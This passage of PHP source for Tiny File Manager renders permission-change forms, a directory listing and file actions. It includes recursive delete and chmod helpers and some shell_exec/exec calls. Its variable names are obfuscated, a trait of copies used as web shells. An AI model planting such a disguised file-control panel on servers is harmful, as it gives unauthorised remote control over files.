 fm_show_footer();exit;}if(isset($_GET['chmod'])&&!FM_READONLY&&!FM_IS_WIN){$ww=$_GET['chmod'];$ww=fm_clean_path($ww);$ww=str_replace('/','',$ww);if($ww==''||(!is_file($iii.'/'.$ww)&&!is_dir($iii.'/'.$ww))){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}fm_show_header();fm_show_nav_path(FM_PATH);$bbbbbbb=FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$ww;$kkk=$iii.'/'.$ww;$pppppp=fileperms($iii.'/'.$ww);?>
    <div class="path">
        <div class="card mb-2 <?php echo fm_get_theme();?>">
            <h6 class="card-header">
                <?php echo lng('ChangePermissions')?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    Full path: <?php echo $kkk?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH)?>">
                    <input type="hidden" name="chmod" value="<?php echo fm_enc($ww)?>">

                    <table class="table compact-table <?php echo fm_get_theme();?>">
                        <tr>
                            <td></td>
                            <td><b><?php echo lng('Owner')?></b></td>
                            <td><b><?php echo lng('Group')?></b></td>
                            <td><b><?php echo lng('Other')?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Read')?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php echo($pppppp&00400)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php echo($pppppp&00040)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php echo($pppppp&00004)?' checked':''?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Write')?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php echo($pppppp&00200)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php echo($pppppp&00020)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php echo($pppppp&00002)?' checked':''?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Execute')?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php echo($pppppp&00100)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php echo($pppppp&00010)?' checked':''?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php echo($pppppp&00001)?' checked':''?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>"> 
                        <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel')?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Change')?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
 fm_show_footer();exit;}fm_show_header();fm_show_nav_path(FM_PATH);fm_show_message();$aaaaaaaa=count($lllll);$bbbbbbbb=count($ssssss);$cccccccc=0;$dddddddd=(FM_THEME=="dark")?"text-white bg-dark table-dark":"bg-white";?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH)?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $dddddddd;?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php if(!FM_READONLY):?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php endif;?>
                <th><?php echo lng('Name')?></th>
                <th><?php echo lng('Size')?></th>
                <th><?php echo lng('Modified')?></th>
                <?php if(!FM_IS_WIN&&!$rr):?>
                    <th><?php echo lng('Perms')?></th>
                    <th><?php echo lng('Owner')?></th><?php endif;?>
                <th><?php echo lng('Actions')?></th>
            </tr>
            </thead>
            <?php
 if($qqqqqq!==false){?>
                <tr><?php if(!FM_READONLY):?>
                    <td class="nosort"></td><?php endif;?>
                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($qqqqqq)?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php if(!FM_IS_WIN&&!$rr){?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php }?>
                </tr>
                <?php
}$eeeeeeee=3399;foreach($ssssss as $mmmmm){$ffffffff=is_link($iii.'/'.$mmmmm);$gggggggg=$ffffffff?'icon-link_folder':'fa fa-folder-o';$hhhhhhhh=filemtime($iii.'/'.$mmmmm);$iiiiiiii=date(FM_DATETIME_FORMAT,$hhhhhhhh);$jjjjjjjj=strtotime(date("F d Y H:i:s.",$hhhhhhhh));$ddddddd="";$eeeeeee=lng('Folder');$kkkkkkkk=substr(decoct(fileperms($iii.'/'.$mmmmm)),-4);if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$llllllll=posix_getpwuid(fileowner($iii.'/'.$mmmmm));$mmmmmmmm=posix_getgrgid(filegroup($iii.'/'.$mmmmm));}else{$llllllll=array('name'=>'?');$mmmmmmmm=array('name'=>'?');}?>
                <tr>
                    <?php if(!FM_READONLY):?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $eeeeeeee?>" name="file[]" value="<?php echo fm_enc($mmmmm)?>">
                            <label class="custom-control-label" for="<?php echo $eeeeeeee?>"></label>
                        </div>
                        </td><?php endif;?>
                    <td data-sort=<?php echo fm_convert_win(fm_enc($mmmmm))?>>
                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$mmmmm,'/'))?>"><i class="<?php echo $gggggggg?>"></i> <?php echo fm_convert_win(fm_enc($mmmmm))?>
                            </a><?php echo($ffffffff?' &rarr; <i>'.readlink($iii.'/'.$mmmmm).'</i>':'')?></div>
                    </td>
                    <td data-order="a-<?php echo str_pad($ddddddd,18,"0",STR_PAD_LEFT);?>">
                        <?php echo $eeeeeee;?>
                    </td>
                    <td data-order="a-<?php echo $jjjjjjjj;?>"><?php echo $iiiiiiii?></td>
                    <?php if(!FM_IS_WIN&&!$rr):?>
                        <td><?php if(!FM_READONLY):?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH)?>&amp;chmod=<?php echo urlencode($mmmmm)?>"><?php echo $kkkkkkkk?></a><?php else:?><?php echo $kkkkkkkk?><?php endif;?>
                        </td>
                        <td><?php echo $llllllll['name'].':'.$mmmmmmmm['name']?></td>
                    <?php endif;?>
                    <td class="inline-actions"><?php if(!FM_READONLY):?>
                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;del=<?php echo urlencode($mmmmm)?>" onclick="confirmDailog(event, '1028','<?php echo lng('Delete').' '.lng('Folder');?>','<?php echo urlencode($mmmmm)?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH))?>', '<?php echo fm_enc(addslashes($mmmmm))?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$mmmmm,'/'))?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php endif;?>
                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$mmmmm.'/')?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php
 flush();$eeeeeeee++;}$nnnnnnnn=6070;foreach($lllll as $mmmmm){$ffffffff=is_link($iii.'/'.$mmmmm);$gggggggg=$ffffffff?'fa fa-file-text-o':fm_get_file_icon_class($iii.'/'.$mmmmm);$hhhhhhhh=filemtime($iii.'/'.$mmmmm);$iiiiiiii=date(FM_DATETIME_FORMAT,$hhhhhhhh);$jjjjjjjj=strtotime(date("F d Y H:i:s.",$hhhhhhhh));$ddddddd=fm_get_size($iii.'/'.$mmmmm);$eeeeeee=fm_get_filesize($ddddddd);$oooooooo='?p='.urlencode(FM_PATH).'&amp;view='.urlencode($mmmmm);$cccccccc+=$ddddddd;$kkkkkkkk=substr(decoct(fileperms($iii.'/'.$mmmmm)),-4);if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$llllllll=posix_getpwuid(fileowner($iii.'/'.$mmmmm));$mmmmmmmm=posix_getgrgid(filegroup($iii.'/'.$mmmmm));}else{$llllllll=array('name'=>'?');$mmmmmmmm=array('name'=>'?');}?>
                <tr>
                    <?php if(!FM_READONLY):?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $nnnnnnnn?>" name="file[]" value="<?php echo fm_enc($mmmmm)?>">
                            <label class="custom-control-label" for="<?php echo $nnnnnnnn?>"></label>
                        </div>
                        </td><?php endif;?>
                    <td data-sort=<?php echo fm_enc($mmmmm)?>>
                        <div class="filename">
                        <?php
 if(in_array(strtolower(pathinfo($mmmmm,PATHINFO_EXTENSION)),array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))):?>
                                <?php $pppppppp=fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$mmmmm);?>
                                <a href="<?php echo $oooooooo?>" data-preview-image="<?php echo $pppppppp?>" title="<?php echo fm_enc($mmmmm)?>">
                           <?php else:?>
                                <a href="<?php echo $oooooooo?>" title="<?php echo $mmmmm?>">
                            <?php endif;?>
                                    <i class="<?php echo $gggggggg?>"></i> <?php echo fm_convert_win(fm_enc($mmmmm))?>
                                </a>
                                <?php echo($ffffffff?' &rarr; <i>'.readlink($iii.'/'.$mmmmm).'</i>':'')?>
                        </div>
                    </td>
                    <td data-order="b-<?php echo str_pad($ddddddd,18,"0",STR_PAD_LEFT);?>"><span title="<?php printf('%s bytes',$ddddddd)?>">
                        <?php echo $eeeeeee;?>
                        </span></td>
                    <td data-order="b-<?php echo $jjjjjjjj;?>"><?php echo $iiiiiiii?></td>
                    <?php if(!FM_IS_WIN&&!$rr):?>
                        <td><?php if(!FM_READONLY):?><a title="<?php echo 'Change Permissions'?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;chmod=<?php echo urlencode($mmmmm)?>"><?php echo $kkkkkkkk?></a><?php else:?><?php echo $kkkkkkkk?><?php endif;?>
                        </td>
                        <td><?php echo fm_enc($llllllll['name'].':'.$mmmmmmmm['name'])?></td>
                    <?php endif;?>
                    <td class="inline-actions">
                        <?php if(!FM_READONLY):?>
                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;del=<?php echo urlencode($mmmmm)?>" onclick="confirmDailog(event, 1209, '<?php echo lng('Delete').' '.lng('File');?>','<?php echo urlencode($mmmmm);?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH))?>', '<?php echo fm_enc(addslashes($mmmmm))?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php echo lng('CopyTo')?>..."
                               href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$mmmmm,'/'))?>"><i class="fa fa-files-o"></i></a>
                        <?php endif;?>
                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH:'').'/'.$mmmmm)?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php echo lng('Download')?>" href="?p=<?php echo urlencode(FM_PATH)?>&amp;dl=<?php echo urlencode($mmmmm)?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Download');?>','<?php echo urlencode($mmmmm);?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php
 flush();$nnnnnnnn++;}if(empty($ssssss)&&empty($lllll)){?>
                <tfoot>
                    <tr><?php if(!FM_READONLY):?>
                            <td></td><?php endif;?>
                        <td colspan="<?php echo(!FM_IS_WIN&&!$rr)?'6':'4'?>"><em><?php echo lng('Folder is empty')?></em></td>
                    </tr>
                </tfoot>
                <?php
}else{?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php echo(!FM_IS_WIN&&!$rr)?(FM_READONLY?'6':'7'):(FM_READONLY?'4':'5')?>">
                            <?php echo lng('FullSize').': <span class="badge text-bg-light border-radius-0">'.fm_get_filesize($cccccccc).'</span>'?>
                            <?php echo lng('File').': <span class="badge text-bg-light border-radius-0">'.$aaaaaaaa.'</span>'?>
                            <?php echo lng('Folder').': <span class="badge text-bg-light border-radius-0">'.$bbbbbbbb.'</span>'?>
                        </td>
                    </tr>
                </tfoot>
                <?php }?>
        </table>
    </div>

    <div class="row">
        <?php if(!FM_READONLY):?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo lng('SelectAll')?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo lng('UnSelectAll')?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo lng('InvertSelection')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo lng('Delete selected files and folders?');?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo lng('Delete')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo lng('Create archive?');?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Zip')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo lng('Create archive?');?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Tar')?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy')?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION;?></a></div>
        <?php else:?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION;?></a></div>
        <?php endif;?>
    </div>
</form>

<?php
fm_show_footer();function print_external($qqqqqqqq){global $ll;if(!array_key_exists($qqqqqqqq,$ll)){echo"<!-- EXTERNAL: MISSING KEY $qqqqqqqq -->";return;}echo"$ll[$qqqqqqqq]";}function verifyToken($rrrrrrrr){if(hash_equals($_SESSION['token'],$rrrrrrrr)){return true;}return false;}function fm_rdelete($iii){if(is_link($iii)){return unlink($iii);}elseif(is_dir($iii)){$rrrrrr=scandir($iii);$ssssssss=true;if(is_array($rrrrrr)){foreach($rrrrrr as $ww){if($ww!='.'&&$ww!='..'){if(!fm_rdelete($iii.'/'.$ww)){$ssssssss=false;}}}}return($ssssssss)?rmdir($iii):false;}elseif(is_file($iii)){return unlink($iii);}return false;}function fm_rchmod($iii,$tttttttt,$uuuuuuuu){if(is_dir($iii)){if(!chmod($iii,$uuuuuuuu)){return false;}$rrrrrr=scandir($iii);if(is_array($rrrrrr)){foreach($rrrrrr as $ww){if($ww!='.'&&$ww!='..'){if(!fm_rchmod($iii.'/'.$ww,$tttttttt,$uuuuuuuu)){return false;}}}}return true;}elseif(is_link($iii)){return true;}elseif(is_file($iii)){return chmod($iii,$tttttttt);}return false;}function fm_is_valid_ext($vvvvv){$llll=(FM_FILE_EXTENSION)?explode(',',FM_FILE_EXTENSION):false;$mmmm=pathinfo($vvvvv,PATHINFO_EXTENSION);$nnnn=($llll)?in_array($mmmm,$llll):true;return($nnnn)?true:false;}function fm_rename($nnnnn,$wwww){$nnnn=fm_is_valid_ext($wwww);if(!is_dir($nnnnn)){if(!$nnnn)return false;}return(!file_exists($wwww)&&file_exists($nnnnn))?rename($nnnnn,$wwww):null;}function fm_rcopy($iii,$zzzz,$vvvvvvvv=true,$wwwwwwww=true){if(is_dir($iii)){if(!fm_mkdir($zzzz,$wwwwwwww)){return false;}$rrrrrr=scandir($iii);$ssssssss=true;if(is_array($rrrrrr)){foreach($rrrrrr as $ww){if($ww!='.'&&$ww!='..'){if(!fm_rcopy($iii.'/'.$ww,$zzzz.'/'.$ww)){$ssssssss=false;}}}}return $ssssssss;}elseif(is_file($iii)){return fm_copy($iii,$zzzz,$vvvvvvvv);}return false;}function fm_mkdir($ggg,$wwwwwwww){if(file_exists($ggg)){if(is_dir($ggg)){return $ggg;}elseif(!$wwwwwwww){return false;}unlink($ggg);}return mkdir($ggg,0777,true);}function fm_copy($xxxxxxxx,$yyyyyyyy,$vvvvvvvv){$zzzzzzzz=filemtime($xxxxxxxx);if(file_exists($yyyyyyyy)){$aaaaaaaaa=filemtime($yyyyyyyy);if($aaaaaaaaa>=$zzzzzzzz&&$vvvvvvvv){return false;}}$ssssssss=copy($xxxxxxxx,$yyyyyyyy);if($ssssssss){touch($yyyyyyyy,$zzzzzzzz);}return $ssssssss;}function fm_get_mime_type($kkk){if(function_exists('finfo_open')){$bbbbbbbbb=finfo_open(FILEINFO_MIME_TYPE);$ccccccccc=finfo_file($bbbbbbbbb,$kkk);finfo_close($bbbbbbbbb);return $ccccccccc;}elseif(function_exists('mime_content_type')){return mime_content_type($kkk);}elseif(!stristr(ini_get('disable_functions'),'shell_exec')){$ww=escapeshellarg($kkk);$ccccccccc=shell_exec('file -bi '.$ww);return $ccccccccc;}else{return'--';}}function fm_redirect($ffff,$uu=302){header('Location: '.$ffff,true,$uu);exit;}function get_absolute_path($iii){$iii=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$iii);$ddddddddd=array_filter(explode(DIRECTORY_SEPARATOR,$iii),'strlen');$eeeeeeeee=array();foreach($ddddddddd as $fffffffff){if('.'==$fffffffff)continue;if('..'==$fffffffff){array_pop($eeeeeeeee);}else{$eeeeeeeee[]=$fffffffff;}}return implode(DIRECTORY_SEPARATOR,$eeeeeeeee);}function fm_clean_path($iii,$ggggggggg=true){$iii=$ggggggggg?trim($iii):$iii;$iii=trim($iii,'\\/');$iii=str_replace(array('../','..\\'),'',$iii);$iii=get_absolute_path($iii);if($iii=='..'){$iii='';}return str_replace('\\','/',$iii);}function fm_get_parent_path($iii){$iii=fm_clean_path($iii);if($iii!=''){$hhhhhhhhh=explode('/',$iii);if(count($hhhhhhhhh)>1){$hhhhhhhhh=array_slice($hhhhhhhhh,0,-1);return implode('/',$hhhhhhhhh);}return'';}return false;}function fm_is_exclude_items($ww){$mmmm=strtolower(pathinfo($ww,PATHINFO_EXTENSION));if(isset($bb)and sizeof($bb)){unset($bb);}$bb=FM_EXCLUDE_ITEMS;if(version_compare(PHP_VERSION,'7.0.0','<')){$bb=unserialize($bb);}if(!in_array($ww,$bb)&&!in_array("*.$mmmm",$bb)){return true;}return false;}function fm_get_translations($iiiiiiiii){try{$ooooooo=@file_get_contents('translation.json');if($ooooooo!==FALSE){$jjjjjjjjj=json_decode($ooooooo,TRUE);global $tt;foreach($jjjjjjjjj["language"]as $qqqqqqqq=>$kkkkkkkkk){$uu=$kkkkkkkkk["code"];$tt[$uu]=$kkkkkkkkk["name"];if($iiiiiiiii)$iiiiiiiii[$uu]=$kkkkkkkkk["translation"];}return $iiiiiiiii;}}catch(Exception $uuu){echo $uuu;}}function fm_get_size($ww){static $lllllllll;static $mmmmmmmmm;if(!isset($lllllllll)){$lllllllll=(strtoupper(substr(PHP_OS,0,3))=='WIN');}if(!isset($mmmmmmmmm)){$mmmmmmmmm=(strtoupper(substr(PHP_OS,0))=="DARWIN");}static $nnnnnnnnn;if(!isset($nnnnnnnnn)){$nnnnnnnnn=(function_exists('exec')&&!ini_get('safe_mode')&&@exec('echo EXEC')=='EXEC');}if($nnnnnnnnn){$ooooooooo=escapeshellarg($ww);$ppppppppp=($lllllllll)?"for %F in (\"$ww\") do @echo %~zF":($mmmmmmmmm?"stat -f%z $ooooooooo":"stat -c%s $ooooooooo");@exec($ppppppppp,$qqqqqqqqq);if(is_array($qqqqqqqqq)&&ctype_digit($rrrrrrrrr=trim(implode("\n",$qqqqqqqqq)))){return $rrrrrrrrr;}}if($lllllllll&&class_exists("COM")){try{$sssssssss=new COM('Scripting.FileSystemObject');$mmmmm=$sssssssss->GetFile(realpath($ww));$rrrrrrrrr=$mmmmm->Size;}catch(Exception $uuu){$rrrrrrrrr=null;}if(ctype_digit($rrrrrrrrr)){return $rrrrrrrrr;}}return filesize($ww);}function fm_get_filesize($rrrrrrrrr){$rrrrrrrrr=(float) $rrrrrrrrr;$ttttttttt=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');$uuuuuuuuu=($rrrrrrrrr>0)?floor(log($rrrrrrrrr,1024)):0;$uuuuuuuuu=($uuuuuuuuu>(count($ttttttttt)-1))?(count($ttttttttt)-1):$uuuuuuuuu;return sprintf('%s %s',round($rrrrrrrrr/pow(1024,$uuuuuuuuu),2),$ttttttttt[$uuuuuuuuu]);}function fm_get_directorysize($vvvvvvvvv){$wwwwwwwww=0;$vvvvvvvvv=realpath($vvvvvvvvv);if($vvvvvvvvv!==false&&$vvvvvvvvv!=''&&file_exists($vvvvvvvvv)){foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($vvvvvvvvv,FilesystemIterator::SKIP_DOTS))as $ww){$wwwwwwwww+=$ww->getSize();}}return $wwwwwwwww;}function fm_get_zif_info($iii,$mmmm){if($mmmm=='zip'&&function_exists('zip_open')){$xxxxxxxxx=@zip_open($iii);if($xxxxxxxxx){$nnnnnnn=array();while($yyyyyyyyy=@zip_read($xxxxxxxxx)){$vvvvvvv=@zip_entry_name($yyyyyyyyy);$zzzzzzzzz=substr($vvvvvvv,-1)=='/';$nnnnnnn[]=array('name'=>$vvvvvvv,'filesize'=>@zip_entry_filesize($yyyyyyyyy),'compressed_size'=>@zip_entry_compressedsize($yyyyyyyyy),'folder'=>$zzzzzzzzz);}@zip_close($xxxxxxxxx);return $nnnnnnn;}}elseif($mmmm=='tar'&&class_exists('PharData')){$aaaaaaaaaa=new PharData($iii);$nnnnnnn=array();foreach(new RecursiveIteratorIterator($aaaaaaaaaa)as $ww){$bbbbbbbbbb=$ww->getPathInfo();$vvvvvvv=str_replace("phar://".$iii,'',$ww->getPathName());$vvvvvvv=substr($vvvvvvv,($cccccccccc=strpos($vvvvvvv,'/'))!==false?$cccccccccc+1:0);$zzzzzzzzz=$bbbbbbbbbb->getFileName();$dddddddddd=new SplFileInfo($ww);$nnnnnnn[]=array('name'=>$vvvvvvv,'filesize'=>$dddddddddd->getSize(),'compressed_size'=>$ww->getCompressedSize(),'folder'=>$zzzzzzzzz);}return $nnnnnnn;}return false;}function fm_enc($eeeeeeeeee){return htmlspecialchars($eeeeeeeeee,ENT_QUOTES,'UTF-8');}function fm_isvalid_filename($eeeeeeeeee){return(strpbrk($eeeeeeeeee,'/?%*:|"<>')===FALSE)?true:false;}function fm_set_msg($vv,$ffffffffff='ok'){$_SESSION[FM_SESSION_ID]['message']=$vv;$_SESSION[FM_SESSION_ID]['status']=$ffffffffff;}function fm_is_utf8($gggggggggg){return preg_match('//u',$gggggggggg);}function fm_convert_win($vvvvv){if(FM_IS_WIN&&function_exists('iconv')){$vvvvv=iconv(FM_ICONV_INPUT_ENC,'UTF-8//IGNORE',$vvvvv);}return $vvvvv;}function fm_object_to_array($hhhhhhhhhh){if(!is_object($hhhhhhhhhh)&&!is_array($hhhhhhhhhh)){return $hhhhhhhhhh;}if(is_object($hhhhhhhhhh)){$hhhhhhhhhh=get_object_vars($hhhhhhhhhh);}return array_map('fm_object_to_array',$hhhhhhhhhh);}function fm_get_file_icon_class($iii){$mmmm=strtolower(pathinfo($iii,PATHINFO_EXTENSION));switch($mmmm){case  'ico':case  'gif':case  'jpg':case  'jpeg':case  'jpc':case  'jp2':case  'jpx':case  'xbm':case  'wbmp':case  'png':case  'bmp':case  'tif':case  'tiff':case  'webp':case  'avif':case  'svg':$gggggggg='fa fa-picture-o';break;case  'passwd':case  'ftpquota':case  'sql':case  'js':case  'ts':case  'jsx':case  'tsx':case  'hbs':case  'json':case  'sh':case  'config':case  'twig':case  'tpl':case  'md':case  'gitignore':case  'c':case  'cpp':case  'cs':case  'py':case  'rs':case  'map':case  'lock':case  'dtd':$gggggggg='fa fa-file-code-o';break;case  'txt':case  'ini':case  'conf':case  'log':case  'htaccess':case  'yaml':case  'yml':case  'toml':case  'tmp':case  'top':case  'bot':case  'dat':case  'bak':case  'htpasswd':case  'pl':$gggggggg='fa fa-file-text-o';break;case  'css':case  'less':case  'sass':case  'scss':$gggggggg='fa fa-css3';break;case  'bz2':case  'zip':case  'rar':case  'gz':case  'tar':case  '7z':case  'xz':$gggggggg='fa fa-file-archive-o';break;case  'php':case  'php4':case  'php5':case  'phps':case  'phtml':$gggggggg='fa fa-code';break;case  'htm':case  'html':case  'shtml':case  'xhtml':$gggggggg='fa fa-html5';break;case  'xml':case  'xsl':$gggggggg='fa fa-file-excel-o';break;case  'wav':case  'mp3':case  'mp2':case  'm4a':case  'aac':case  'ogg':case  'oga':case  'wma':case  'mka':case  'flac':case  'ac3':case  'tds':$gggggggg='fa fa-music';break;case  'm3u':case  'm3u8':case  'pls':case  'cue':case  'xspf':$gggggggg='fa fa-headphones';break;case  'avi':case  'mpg':case  'mpeg':case  'mp4':case  'm4v':case  'flv':case  'f4v':case  'ogm':case  'ogv':case  'mov':case  'mkv':case  '3gp':case  'asf':case  'wmv':case  'webm':$gggggggg='fa fa-file-video-o';break;case  'eml':case  'msg':$gggggggg='fa fa-envelope-o';break;case  'xls':case  'xlsx':case  'ods':$gggggggg='fa fa-file-excel-o';break;case  'csv':$gggggggg='fa fa-file-text-o';break;case  'bak':case  'swp':$gggggggg='fa fa-clipboard';break;case  'doc':case  'docx':case  'odt':$gggggggg='fa fa-file-word-o';break;case  'ppt':case  'pptx':$gggggggg='fa fa-file-powerpoint-o';break;case  'ttf':case  'ttc':case  'otf':case  'woff':case  'woff2':case  'eot':case  'fon':$gggggggg='fa fa-font';break;case  'pdf':$gggggggg='fa fa-file-pdf-o';break;case  'psd':case  'ai':case  'eps':case  'fla':case  'swf':$gggggggg='fa fa-file-image-o';break;case  'exe':case  'msi':$gggggggg='fa fa-file-o';break;case  'bat':$gggggggg='fa fa-terminal';break;default:$gggggggg='fa fa-info-circle';}return $gggggggg;}function fm_get_image_exts(){return array('ico','gif','jpg','jpeg','jpc','jp2','jpx','xbm','wbmp','png','bmp','tif','tiff','psd','svg','webp','avif');}function fm_get_video_exts(){return array('avi','webm','wmv','mp4','m4v','ogm','ogv','mov','mkv');}function fm_get_audio_exts(){return array('wav','mp3','ogg','m4a');}function fm_get_text_exts(){return array('txt','css','ini','conf','log','htaccess','passwd','ftpquota','sql','js','ts','jsx','tsx','mjs','json','sh','config','php','php4','php5','phps','phtml','htm','html','shtml','xhtml','xml','xsl','m3u','m3u8','pls','cue','bash','vue','eml','msg','csv','bat','twig','tpl','md','gitignore','less','sass','scss','c','cpp','cs','py','go','zsh','swift','map','lock','dtd','svg','asp','aspx','asx','asmx','ashx','jsp','jspx','cgi','dockerfile','ruby','yml','yaml','toml','vhost','scpt','applescript','csx','cshtml','c++','coffee','cfm','rb','graphql','mustache','jinja','http','handlebars','java','es','es6','markdown','wiki','tmp','top','bot','dat','bak','htpasswd','pl');}function fm_get_text_mimes(){return array('application/xml','application/javascript','application/x-javascript','image/svg+xml','message/rfc822','application/json',);}function fm_get_text_names(){return array('license','readme','authors','contributors','changelog',);}function fm_get_onlineViewer_exts(){return array('doc','docx','xls','xlsx','pdf','ppt','pptx','ai','psd','dxf','xps','rar','odt','ods');}function 